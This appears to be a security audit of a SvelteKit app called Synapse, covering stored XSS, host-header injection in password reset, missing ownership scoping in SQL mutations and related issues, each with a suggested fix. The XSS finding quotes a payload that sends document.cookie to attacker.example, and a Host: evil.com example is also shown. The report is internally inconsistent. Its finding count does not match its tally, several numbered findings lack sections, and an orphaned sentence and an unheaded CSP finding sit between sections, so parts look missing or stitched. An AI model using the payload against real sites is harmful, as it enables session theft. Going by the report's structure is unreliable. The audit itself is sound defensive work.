## Executive Summary

The Synapse codebase demonstrates **strong foundational security**. The authentication layer (Better Auth), input validation (Superforms + Zod), and authorization pattern (`requireAuth` / `getUser`) are well-structured. Security headers in `hooks.server.ts` are comprehensive, CSP is nonce-based, HSTS is production-only, and error messages are sanitized.

Seven findings were identified — **zero P0 (critical)**. The most significant issues are:

- **P1 (×2):** Stored XSS via unsanitized markdown `{@html}` rendering in journal components. Host-header injection in password-reset `redirectTo` construction.
- **P2 (×4):** Ownership-check / mutation mismatch ("check-then-act without scoped WHERE") in `workoutReminders` and `deleteRoutine`. Unvalidated exercise JSON in `logWorkout`. Three email functions bypass `getEnv()` validation with `process.env` direct access.
- **P3 (×7):** Timing-unsafe CRON token comparison, PII in external notification payloads, `CRON_SECRET` bypassing `getEnv()`, `unsafe-inline` CSP, query-param message injection, no rate limiting on custom actions, LIKE wildcard exposure.

All findings are addressable with surgical, low-risk fixes.

### [F-01] P1 — Host Header Injection in Password Reset `redirectTo`

**File:** `src/routes/(auth)/forgot-password/+page.server.ts` (line 34)  
**Also relevant:** `src/lib/server/auth.ts` (lines 53–65)  
**Type:** Host Header Injection / Open Redirect

**Risk:** An attacker who can manipulate the `Host` HTTP header (possible when the app is fronted by a misconfigured proxy or tested directly) can cause the password reset email to contain a link to an attacker-controlled domain, enabling account takeover.

**Evidence:**

```ts
// forgot-password/+page.server.ts
const redirectTo = `${url.origin}/reset-password`; // ← url.origin derived from Host header

await auth.api.requestPasswordReset({
	body: { email: form.data.email, redirectTo }
});
```

```ts
// auth.ts
sendResetPassword: async ({ user, url, token }) => {
	const urlObj = new URL(url, 'http://localhost');
	const callbackUrl = urlObj.searchParams.get('callbackUrl'); // derived from redirectTo
	const resetUrl = `${callbackUrl}?token=${token}`;
	void sendPasswordResetEmail(user.email, user.name, resetUrl); // sent to user
};
```

If `Host: evil.com` is accepted, the victim receives a reset email with `https://evil.com/reset-password?token=<valid_token>` and the attacker captures the reset token.

**Context / Mitigations in place:** SvelteKit's `adapter-node` respects the `ORIGIN` environment variable; if `ORIGIN` is set in production on Fly.io, `event.url.origin` is fixed and this vector is closed. Better Auth's `trustedOrigins` list (`['https://synapse.fly.dev']`) may also validate `redirectTo` depending on the library version. The risk is conditional on deployment configuration.

**Recommended Fix:**

Option A — Hard-code the origin from env (preferred):

```ts
// forgot-password/+page.server.ts
import { getEnv } from '../../../env';

const env = getEnv();
const redirectTo = `${env.BETTER_AUTH_BASE_URL}/reset-password`;
```

Option B — Validate `url.origin` against the allow-list before use:

```ts
const allowedOrigins = ['https://synapse.fly.dev', 'http://localhost:5173'];
const origin = allowedOrigins.includes(url.origin) ? url.origin : env.BETTER_AUTH_BASE_URL;
const redirectTo = `${origin}/reset-password`;
```

**Verification:** Confirm `ORIGIN` env var is set in Fly.io `fly.toml` or secrets. Test with `Host: evil.com` header against the production-equivalent config.

### [F-02] P2 — TOCTOU: `workoutReminders` Mutations Missing `userId` in SQL WHERE Clause

**File:** `src/routes/(app)/fitness/+page.server.ts` (lines 480–505, 537–545)  
**Type:** IDOR / Check-Then-Act Race Condition

**Risk:** Ownership is verified in a separate `findFirst` query, but the subsequent `update` and `delete` SQL operations are scoped only by record ID. Under a TOCTOU race (or future code changes), a different user's reminder could be mutated.

**Evidence:**

```ts
// Ownership check
const existing = await db.query.workoutReminders.findFirst({
  where: eq(workoutReminders.id, form.data.id)   // ← no userId filter
});
if (!existing || existing.userId !== user.id) { return fail(404, ...); }

// Mutation — no userId in WHERE
await db.update(workoutReminders)
  .set({ ... })
  .where(eq(workoutReminders.id, form.data.id));  // ← only id, not userId
```

**Recommended Fix:** Combine ownership into the mutation predicate (eliminates both the TOCTOU and the need for a pre-check query):

```ts
const result = await db.update(workoutReminders)
  .set({ workoutType: ..., ..., updatedAt: new Date().toISOString() })
  .where(and(eq(workoutReminders.id, form.data.id), eq(workoutReminders.userId, user.id)))
  .returning({ id: workoutReminders.id });

if (result.length === 0) {
  return message(form, { type: 'error', text: 'Reminder not found or access denied.' }, { status: 404 });
}
```

Apply the same pattern to `deleteWorkoutReminder`.

### [F-03] P2 — TOCTOU: `deleteRoutine` Missing `userId` in SQL WHERE Clause

**File:** `src/routes/(app)/meditation/routines/[id]/+page.server.ts` (lines 421–433)  
**Type:** IDOR / Check-Then-Act

**Risk:** Same pattern as F-02. Ownership verified via `findFirst`, but the actual `DELETE` is not userId-scoped.

**Evidence:**

```ts
// Check
const routine = await db.query.meditationRoutines.findFirst({
  where: and(eq(meditationRoutines.id, routineId), eq(meditationRoutines.userId, user.id))
});
if (!routine || routine.isPredefined || routine.userId !== user.id) { return fail(...); }

// Delete — userId not in WHERE
await db.delete(meditationRoutines).where(eq(meditationRoutines.id, routineId));
```

**Recommended Fix:**

```ts
await db
	.delete(meditationRoutines)
	.where(
		and(
			eq(meditationRoutines.id, routineId),
			eq(meditationRoutines.userId, user.id),
			eq(meditationRoutines.isPredefined, false)
		)
	);
```

This renders the pre-check unnecessary for the auth guard, though you may keep it for the `isPredefined` business logic.

### [F-05] P3 — Timing-Unsafe Bearer Token Comparison in Cron Endpoint

**File:** `src/routes/api/cron/email-notifications/+server.ts` (line 15)  
**Type:** Timing Side-Channel

**Risk:** String equality (`!==`) is not constant-time. A sufficiently motivated attacker with high-bandwidth access could infer the secret length and content via timing. Low practical risk, but `crypto.timingSafeEqual` is the accepted standard.

**Evidence:**

```ts
if (!authHeader || authHeader !== `Bearer ${expectedToken}`) {
```

**Recommended Fix:**

```ts
import { timingSafeEqual } from 'crypto';

const expected = Buffer.from(`Bearer ${expectedToken}`);
const provided = Buffer.from(authHeader ?? '');
const isValid = provided.length === expected.length && timingSafeEqual(provided, expected);

if (!isValid) {
	logger.warn('⚠️ Unauthorized cron job attempt');
	return json({ error: 'Unauthorized' }, { status: 401 });
}
```

### [F-06] P3 — `CRON_SECRET` Accessed via `process.env`, Bypassing `getEnv()` Validation

**File:** `src/routes/api/cron/email-notifications/+server.ts` (line 8)  
**Type:** Configuration Inconsistency / Missing Fail-Fast

**Risk:** `CRON_SECRET` is the only runtime secret not validated by the `getEnv()` / `envSchema` system. A missing `CRON_SECRET` in production returns a 503 rather than a startup failure. The existing startup check for other critical vars would not catch this.

**Evidence:**

```ts
const expectedToken = process.env.CRON_SECRET; // direct process.env access

if (!expectedToken || expectedToken.trim().length === 0) {
	return json({ error: 'Service unavailable' }, { status: 503 });
}
```

**Recommended Fix:** Add `CRON_SECRET` to `src/env.ts`:

```ts
// env.ts – add to envSchema
CRON_SECRET: z.string().min(16);
```

And in `getEnv()` production block:

```ts
cronSecret: assertProductionVar('CRON_SECRET', env.CRON_SECRET, '');
```

Then use `getEnv().CRON_SECRET` in the cron handler.

Alternatively, if the full email is operationally required, document the data-sharing relationship and include the notification service in your privacy policy.

**Type:** CSP Weakening / XSS Impact Amplification

**Risk:** `'unsafe-inline'` for `style-src` allows any injected `<style>` or `style=` attribute to execute, increasing the damage radius of any XSS vulnerability that bypasses script controls. The narrower `style-src-attr 'unsafe-inline'` is also present.

**Interim hardening:** Ensure `style-src-attr` is kept narrow and do not widen `style-src` further.

### [F-09] P3 — Query-Parameter Message Reflected into Auth Form State

**File:** `src/lib/server/auth/form-helpers.ts` (lines 28–32)  
**Type:** Message Injection / UI Redress

**Risk:** The `message` query parameter is read from the URL and set directly as `form.message`, which is displayed in the UI. An attacker could craft URLs with misleading messages (e.g., `/sign-in?message=Your+account+has+been+locked`). SvelteKit's Svelte rendering auto-escapes HTML so XSS is prevented, but the social-engineering surface exists.

**Evidence:**

```ts
const queryMessage = url.searchParams.get(messageParam);
if (queryMessage) {
	form.message = queryMessage; // ← unvalidated string from URL
}
```

**Recommended Fix:** Restrict to an explicit allowed-message allowlist, or truncate/strip the message to a safe length with no HTML:

```ts
const MAX_MSG_LEN = 200;
const queryMessage = url.searchParams.get(messageParam);
if (queryMessage) {
	form.message = queryMessage.slice(0, MAX_MSG_LEN).replace(/<[^>]*>/g, '');
}
```

Or use a message key pattern (`?msg=password_reset_success`) and resolve to a hard-coded string server-side.

### [F-11] P1 — Stored XSS via Unsanitized Markdown Rendering (`{@html}`)

**Files:**

- `src/lib/components/journal/JournalEntryCard.svelte` (lines 8, 16, 93)
- `src/lib/components/journal/JournalEntryEditor.svelte` (lines 18, 35, 474)

**Type:** Stored Cross-Site Scripting (XSS)

**Risk:** User-authored journal content is converted from Markdown to HTML using `marked.parse()` without any HTML sanitization step, then injected into the DOM via Svelte's `{@html}`. The `marked` library preserves embedded HTML by default — a user who writes `<img src=x onerror="fetch('//attacker.example?c='+document.cookie)">` in a journal entry will have that tag rendered verbatim.

The existing nonce-based `script-src` CSP blocks classic `<script>` injection, but:

1. **Inline event handlers** (`onerror`, `onload`, `onclick`, etc.) are **not blocked** by `script-src`
2. **`javascript:` URIs** in rendered links are not blocked
3. Any future admin/support feature that can view entries would expose other users

**Evidence:**

```typescript
// JournalEntryCard.svelte:16 — no sanitization
let previewHtml = $derived(marked.parse(entry.content));
// JournalEntryCard.svelte:93
{@html previewHtml}

// JournalEntryEditor.svelte:35 — same pattern
let previewHtml = $derived(marked.parse(markdown, markdownOptions));
// JournalEntryEditor.svelte:474
{@html previewHtml}
```

**PoC:** Journal entry content `<img src=x onerror="alert(document.cookie)">` → alert fires on render.

**Recommended Fix:**

```bash
npm install isomorphic-dompurify
```

```typescript
// JournalEntryCard.svelte
import { marked } from 'marked';
import DOMPurify from 'isomorphic-dompurify';

let previewHtml = $derived(DOMPurify.sanitize(marked.parse(entry.content) as string));

// JournalEntryEditor.svelte
import DOMPurify from 'isomorphic-dompurify';

let previewHtml = $derived(DOMPurify.sanitize(marked.parse(markdown, markdownOptions) as string));
```

**Verification:** Create journal entry with `<img src=x onerror="alert(1)">`. Before fix: alert fires. After fix: the `onerror` attribute is stripped by DOMPurify.

### [F-12] P2 — `process.env.RESEND_FROM_ADDRESS` Bypasses Validated `getEnv()` in Three Email Functions

**File:** `src/lib/server/email/index.ts` (lines 147, 202, 265)
**Type:** Inconsistent environment variable access; silent production failure

**Risk:** Three email sending functions use `process.env.RESEND_FROM_ADDRESS || ''` directly instead of the validated `env.RESEND_FROM_ADDRESS` from the module-level `getEnv()` call. If `RESEND_FROM_ADDRESS` is unset in production, these functions silently fall back to an empty `from` address, causing Resend to reject the email — with no startup-time warning and no thrown error visible in the call stack. This affects `sendWorkoutReminderEmail`, `sendMeditationReminderEmail`, and `sendVisitWarningEmail`.

**Evidence:**

```typescript
// Lines 147, 202, 265 — direct process.env with silent fallback:
from: process.env.RESEND_FROM_ADDRESS || '',

// All other email functions in the same file — correct pattern:
from: env.RESEND_FROM_ADDRESS,   // uses module-level const env = getEnv()
```

**Recommended Fix:** Replace all three occurrences:

```typescript
// Before:
from: process.env.RESEND_FROM_ADDRESS || '',
// After:
from: env.RESEND_FROM_ADDRESS,
```

The `const env = getEnv()` is already declared at the top of the module.

### [F-13] P3 — LIKE Wildcard Characters Not Escaped in Search Queries

**Files:**

- `src/routes/(app)/journal/+page.server.ts` (line 35)
- `src/routes/(app)/meditation/+page.server.ts` (lines 57, 60)
- `src/routes/(app)/tasks/+page.server.ts` (line 403)

**Type:** Insufficient input normalization; unintended record exposure

**Risk:** User-supplied search values are inserted directly into LIKE patterns (`%value%`) without escaping SQLite LIKE wildcard characters (`%` and `_`). Drizzle parameterizes the query so there is **no SQL injection risk**, but:

- A user searching for `%` matches every record (unintentional data dump of own records)
- `_` matches any single character, giving imprecise results
- Tag filters using `%"tagName"%` patterns expose adjacent tags when `tagName` contains `%`

**Evidence:**

```typescript
// journal/+page.server.ts — % in content would match all entries
like(journalEntries.content, `%${content.trim()}%`);

// tasks/+page.server.ts — % in tag would match all tasks
like(tasks.tags, `%"${value}"%`);
```

**Recommended Fix:**

```typescript
function escapeLike(value: string): string {
	return value.replace(/\\/g, '\\\\').replace(/%/g, '\\%').replace(/_/g, '\\_');
}

// Usage:
like(journalEntries.content, `%${escapeLike(content.trim())}%`);
```

Note: SQLite LIKE requires an `ESCAPE '\'` clause to honour backslash escapes. Until Drizzle exposes this option in `like()`, use a raw `sql` template for precision-critical cases.

### [F-10] P3 — No Rate Limiting on Custom Form Actions

**File:** All `+page.server.ts` action handlers  
**Type:** Missing Abuse Control

**Risk:** Better Auth applies rate limiting (5 req/60s per IP) to auth endpoints only. Custom form actions — task creates, journal writes, fitness log entries, visit logs — have no rate limiting. A motivated attacker or scripted client could flood these endpoints.

**Recommended Fix:** Add a lightweight rate-limit utility (e.g., an in-memory sliding window or a Redis-backed store) applied in `hooks.server.ts` for non-auth `POST`/`PATCH`/`DELETE` actions:

```ts
// hooks.server.ts — example pattern
if (event.request.method !== 'GET' && !event.url.pathname.startsWith('/api/auth')) {
	const ip = event.getClientAddress();
	if (isRateLimited(ip)) {
		return new Response('Too Many Requests', { status: 429 });
	}
}
```

## Residual Risks / Follow-ups

1. **Fly.io `ORIGIN` environment variable:** Confirm `ORIGIN=https://synapse.fly.dev` is set as a Fly secret or in `fly.toml`. If it is, F-01 is already mitigated at the infrastructure level — but the code-level fix (F-01) is still recommended as defense-in-depth.

2. **Better Auth `redirectTo` validation:** Verify which version of `better-auth` is installed and whether it validates the `redirectTo` URL against `trustedOrigins`. If it does, document this and lower F-01 to P2.

3. **SQLite single-writer model:** The TOCTOU issues in F-02/F-03/F-04 are low-severity in a SQLite context (no concurrent writers), but the fixes are still recommended because: (a) the codebase may migrate to Postgres, and (b) defense-in-depth.

4. **`AUTH_ALERTS_URL` / `REMINDER_ALERTS_URL` service:** Confirm the notification service provider's data retention policy. If these URLs point to a service with long log retention (e.g., ntfy.sh self-hosted vs. managed), reassess F-07 priority.

5. **Fitness `logWorkout` `exercises` JSON (F-12 addendum):** `src/routes/(app)/fitness/+page.server.ts` line 285 parses user-supplied JSON without a Zod schema, relying only on `Array.isArray` and `exercise.exerciseName` presence. The update path (`updateWorkout`) correctly uses `exercisesArraySchema.safeParse`. Applying the same schema to `logWorkout` eliminates the inconsistency and any future risk from schema drift.

6. **`meditation/routines/[id]` `createSchedule` uses `getUser(locals)` instead of injected `user`:** Lines 173 and 181 call `getUser(locals).id` when the `user` parameter from `requireAuth` is already available. Functionally equivalent but stylistically inconsistent — recommend using `user.id` throughout for clarity.
